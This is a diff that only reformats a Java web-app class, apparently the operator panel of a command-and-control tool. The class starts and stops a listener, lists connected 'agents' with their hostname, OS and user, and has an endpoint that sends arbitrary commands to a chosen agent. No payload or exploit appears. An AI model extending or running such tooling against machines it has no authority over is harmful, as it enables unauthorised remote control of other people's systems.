@@ -1,14 +1,13 @@
 package com.tomcat.iface;
 
 import com.google.gson.Gson;
+import com.sun.net.httpserver.*;
 import com.tomcat.core.event.EventManager;
 import com.tomcat.core.event.EventManager.EventType;
 import com.tomcat.core.output.Logger;
 import com.tomcat.core.server.TomcatServer;
 import com.tomcat.core.session.Session;
 import com.tomcat.utils.ServerConfig;
-
-import com.sun.net.httpserver.*;
 import java.io.*;
 import java.net.*;
 import java.nio.file.*;
@@ -18,6 +17,7 @@ import java.util.*;
 import java.util.concurrent.*;
 
 public class WebApp {
+
     private final ServerConfig Config;
     private TomcatServer Server;
     private HttpServer HttpSrv;
@@ -56,7 +56,9 @@ public class WebApp {
     }
 
     @FunctionalInterface
-    interface RequestHandler { String Handle(HttpExchange E) throws Exception; }
+    interface RequestHandler {
+        String Handle(HttpExchange E) throws Exception;
+    }
 
     private void HandleRequest(HttpExchange E, RequestHandler Handler) {
         try {
@@ -71,13 +73,17 @@ public class WebApp {
             String Response = Handler.Handle(E);
             byte[] Bytes = Response.getBytes("UTF-8");
             E.sendResponseHeaders(200, Bytes.length);
-            try (OutputStream Os = E.getResponseBody()) { Os.write(Bytes); }
+            try (OutputStream Os = E.getResponseBody()) {
+                Os.write(Bytes);
+            }
         } catch (Exception Ex) {
             try {
                 String Err = GsonInst.toJson(Map.of("Error", Ex.getMessage()));
                 byte[] Bytes = Err.getBytes("UTF-8");
                 E.sendResponseHeaders(500, Bytes.length);
-                try (OutputStream Os = E.getResponseBody()) { Os.write(Bytes); }
+                try (OutputStream Os = E.getResponseBody()) {
+                    Os.write(Bytes);
+                }
             } catch (IOException Ignored) {}
         }
     }
@@ -97,8 +103,9 @@ public class WebApp {
     }
 
     private String ApiServerStart(HttpExchange E) throws Exception {
-        if (Server != null && Server.IsRunning())
-            return GsonInst.toJson(Map.of("Success", false, "Message", "Server Already Running"));
+        if (Server != null && Server.IsRunning()) return GsonInst.toJson(
+            Map.of("Success", false, "Message", "Server Already Running")
+        );
         Map<String, Object> Body = ParseBody(E);
         String Host = Body.getOrDefault("Host", Config.GetServerHost()).toString();
         int Port = (int) Double.parseDouble(Body.getOrDefault("Port", Config.GetServerPort()).toString());
@@ -126,8 +133,9 @@ public class WebApp {
     }
 
     private String ApiServerStop(HttpExchange E) {
-        if (Server == null || !Server.IsRunning())
-            return GsonInst.toJson(Map.of("Success", false, "Message", "Server not running"));
+        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(
+            Map.of("Success", false, "Message", "Server not running")
+        );
         Server.StopServer();
         ServerStartTime = null;
         AddLog("[!] Server Stopped");
@@ -135,8 +143,7 @@ public class WebApp {
     }
 
     private String ApiGetAgents(HttpExchange E) {
-        if (Server == null || !Server.IsRunning())
-            return GsonInst.toJson(Map.of("Agents", Collections.emptyList()));
+        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(Map.of("Agents", Collections.emptyList()));
         List<Map<String, Object>> Agents = new ArrayList<>();
         for (Session S : Server.GetSessions().GetAll()) {
             Map<String, Object> A = new LinkedHashMap<>();
@@ -166,13 +173,15 @@ public class WebApp {
     }
 
     private String ApiExecuteCommand(HttpExchange E) throws Exception {
-        if (Server == null || !Server.IsRunning())
-            return GsonInst.toJson(Map.of("Success", false, "Output", "Server not running"));
+        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(
+            Map.of("Success", false, "Output", "Server not running")
+        );
         Map<String, Object> Body = ParseBody(E);
         int AgentId = (int) Double.parseDouble(Body.getOrDefault("AgentId", 0).toString());
         String Command = Body.getOrDefault("Command", "").toString();
-        if (AgentId == 0 || Command.isEmpty())
-            return GsonInst.toJson(Map.of("Success", false, "Output", "Missing AgentId or Command"));
+        if (AgentId == 0 || Command.isEmpty()) return GsonInst.toJson(
+            Map.of("Success", false, "Output", "Missing AgentId or Command")
+        );
         AddLog("[>] Agent " + AgentId + " | Executing: " + Command);
         String[] Result = Server.ExecuteCommand(AgentId, Command);
         boolean Ok = Boolean.parseBoolean(Result[0]);
@@ -183,12 +192,19 @@ public class WebApp {
 
     private void EventHandler(EventType Type, Map<String, Object> Data) {
         switch (Type) {
-            case AgentConnected -> AddLog(String.format(
-                "[+] New Session [%s] ID:%s Hostname:%s OS:%s User:%s",
-                Data.get("Type"), Data.get("ID"), Data.get("Hostname"),
-                Data.get("OS"), Data.get("User")));
+            case AgentConnected -> AddLog(
+                String.format(
+                    "[+] New Session [%s] ID:%s Hostname:%s OS:%s User:%s",
+                    Data.get("Type"),
+                    Data.get("ID"),
+                    Data.get("Hostname"),
+                    Data.get("OS"),
+                    Data.get("User")
+                )
+            );
             case AgentDisconnected -> AddLog(
-                "[!] Session Disconnected ID:" + Data.get("ID") + " Reason:" + Data.get("Reason"));
+                "[!] Session Disconnected ID:" + Data.get("ID") + " Reason:" + Data.get("Reason")
+            );
             case Error -> AddLog("[!] " + Data.get("Message"));
         }
     }
@@ -214,6 +230,7 @@ public class WebApp {
     }
 
     class StaticHandler implements HttpHandler {
+
         @Override
         public void handle(HttpExchange E) throws IOException {
             String Path = E.getRequestURI().getPath();
@@ -232,7 +249,9 @@ public class WebApp {
             E.getResponseHeaders().add("Content-Type", ContentType);
             byte[] Data = Files.readAllBytes(FullPath);
             E.sendResponseHeaders(200, Data.length);
-            try (OutputStream Os = E.getResponseBody()) { Os.write(Data); }
+            try (OutputStream Os = E.getResponseBody()) {
+                Os.write(Data);
+            }
         }
 
         private String GetContentType(String Path) {
